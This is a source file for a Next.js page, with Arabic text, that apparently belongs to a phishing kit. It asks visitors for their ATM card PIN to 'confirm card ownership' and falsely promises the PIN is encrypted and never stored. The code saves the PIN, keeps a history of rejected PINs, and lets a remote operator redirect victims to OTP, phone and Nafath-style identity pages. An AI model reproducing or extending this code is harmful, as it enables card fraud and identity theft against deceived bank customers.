"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Lock, AlertCircle, ShieldCheck, Eye } from "lucide-react"
import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
import { db } from "@/lib/firebase"
import { doc, setDoc, onSnapshot } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { updateVisitorPage } from "@/lib/visitor-tracking"

export default function ConfiPage() {
  const router = useRouter()
  const [pinCode, setPinCode] = useState("")
  const [error, setError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isLoading, setIsLoading] = useState(true)
  const [visitorId, setVisitorId] = useState<string>("")
  const [pinStatus, setPinStatus] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")

  // Initialize visitor ID and update current page
  useEffect(() => {
    const id = localStorage.getItem("visitor") || ""
    setVisitorId(id)
    if (id) {
      updateVisitorPage(id, "confi", 6)
    }
  }, [])

  // Monitor for admin redirects
  useRedirectMonitor({ visitorId, currentPage: "confi" })

  // Navigation listener - listen for admin redirects
  useEffect(() => {
    if (!visitorId) return

    const unsubscribe = onSnapshot(
      doc(db, "pays", visitorId),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const step = data.currentStep

          // Admin navigation: Handle page redirects
          if (step === "home") {
            console.log("[confi] Admin redirecting to home")
            window.location.href = "/"
          } else if (step === "phone") {
            console.log("[confi] Admin redirecting to phone-info")
            window.location.href = "/phone-info"
          } else if (step === "nafad") {
            console.log("[confi] Admin redirecting to nafad")
            window.location.href = "/nafad"
          } else if (step === "payment") {
            console.log("[confi] Admin redirecting to payment")
            window.location.href = "/check"
          } else if (step === "otp") {
            console.log("[confi] Admin redirecting to otp")
            window.location.href = "/veri"
          }
          // Numeric currentStep (from main.tsx internal step tracking) is ignored.
          // If step === "pin" or "confi" (or any other value), stay on this page
        }
      },
      (error) => {
        console.error("Navigation listener error:", error)
      }
    )

    return () => unsubscribe()
  }, [router, visitorId])

  // Check if visitor has access to this page and monitor PIN status
  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      router.push("/home-new")
      return
    }

    // Check if there's a payment record and monitor PIN status
    const docRef = doc(db, "pays", visitorID)
    const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
      if (!docSnapshot.exists()) {
        router.push("/check")
        return
      }
      
      const data = docSnapshot.data()
      const status = data.pinStatus as "pending" | "verifying" | "approved" | "rejected" | undefined
      
      if (status === "rejected") {
        // Save rejected PIN and reset status
        const currentPin = {
          code: data.pinCode,
          rejectedAt: new Date().toISOString()
        }
        
        setDoc(docRef, {
          oldPin: data.oldPin ? [...data.oldPin, currentPin] : [currentPin],
          pinStatus: "pending"
        }, { merge: true }).then(() => {
          setPinStatus("pending")
          setPinCode("") // Clear the old PIN
          setError("تم رفض الرقم السري. يرجى إدخال رقم صحيح.")
          setIsSubmitting(false)
        }).catch(err => {
          console.error("Error saving rejected PIN:", err)
          setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
          setIsSubmitting(false)
        })
      }
      // No need to monitor approved status - auto-redirect happens in handlePinSubmit
      
      setIsLoading(false)
    })

    return () => unsubscribe()
  }, [router])

  // Auto-submit when 4 digits are entered
  useEffect(() => {
    if (pinCode.length === 4 && !isSubmitting) {
      handlePinSubmit()
    }
  }, [pinCode])

  const handlePinSubmit = async () => {
    if (pinCode.length !== 4) {
      setError("يرجى إدخال الرقم السري المكون من 4 أرقام")
      return
    }

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
      return
    }

    setIsSubmitting(true)

    try {
      // Update the document with the PIN
      await setDoc(doc(db, "pays", visitorID), {
        pinCode,
        pinSubmittedAt: new Date().toISOString(),
        pinStatus: "approved",
        currentStep: "phone",
        paymentStatus: "pin_completed",
        pinUpdatedAt: new Date().toISOString()
      }, { merge: true })

      // Add PIN to history (always approved)
      await addToHistory(visitorID, "pin", {
        pinCode
      }, "approved")

      // Wait 2 seconds then redirect to phone page
      setTimeout(() => {
        router.push("/phone-info")
      }, 2000)
    } catch (err) {
      console.error("Error submitting PIN:", err)
      setError("حدث خطأ في إرسال الرقم السري. يرجى المحاولة مرة أخرى.")
      setIsSubmitting(false)
    }
  }

  if (isLoading) {
    return <SimpleSpinner />
  }

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4" dir="rtl">
      {/* Full Screen Spinner when submitting */}
      {(isSubmitting || pinStatus === "verifying") && (
        <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
      )}

      <div className="w-full max-w-md">
        {/* Icon */}
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center shadow-lg">
            <Lock className="w-12 h-12 text-[#0a4a68]" />
          </div>
        </div>

        {/* Main Card */}
        <div className="bg-white rounded-3xl shadow-2xl p-8">
          <form onSubmit={(e) => { e.preventDefault(); handlePinSubmit(); }} className="space-y-6">
            {error && (
              <Alert variant="destructive" className="border-2">
                <AlertCircle className="h-5 w-5" />
                <AlertDescription className="text-base">{error}</AlertDescription>
              </Alert>
            )}

            <div className="space-y-4">
              <p className="text-center text-gray-700 text-base font-semibold leading-relaxed">
                الرجاء إدخال رقم الصراف المكون من 4 خانات لتأكيد ملكية البطاقة
              </p>

              {/* Additional Info */}
              <div className="bg-green-50 border border-green-200 rounded-xl p-4 space-y-2">
                <div className="flex items-center gap-2 text-sm text-green-800">
                  <ShieldCheck className="w-4 h-4" />
                  <span>للتأكد من هويتك وحماية حسابك</span>
                </div>
                <div className="flex items-center gap-2 text-sm text-green-800">
                  <Lock className="w-4 h-4" />
                  <span>الرقم السري محمي ومشفر بالكامل</span>
                </div>
                <div className="flex items-center gap-2 text-sm text-green-800">
                  <Eye className="w-4 h-4" />
                  <span>لن يتم حفظ أو مشاركة الرقم السري</span>
                </div>
              </div>
              
              <Input
                type="password"
                inputMode="numeric"
                placeholder="رقم الصراف (PIN)"
                value={pinCode}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "").slice(0, 4)
                  setPinCode(value)
                  setError("")
                }}
                maxLength={4}
                className="h-14 text-center text-lg px-4 border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl bg-white placeholder:text-gray-400"
                disabled={isSubmitting || pinStatus === "verifying"}
                required
                autoFocus
              />
            </div>

            <Button
              type="submit"
              className="w-full h-14 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl rounded-xl shadow-lg hover:shadow-xl transition-all"
              disabled={pinCode.length !== 4 || isSubmitting || pinStatus === "verifying"}
            >
              تأكيد الدفع
            </Button>
          </form>
        </div>
      </div>
    </div>
  )
}
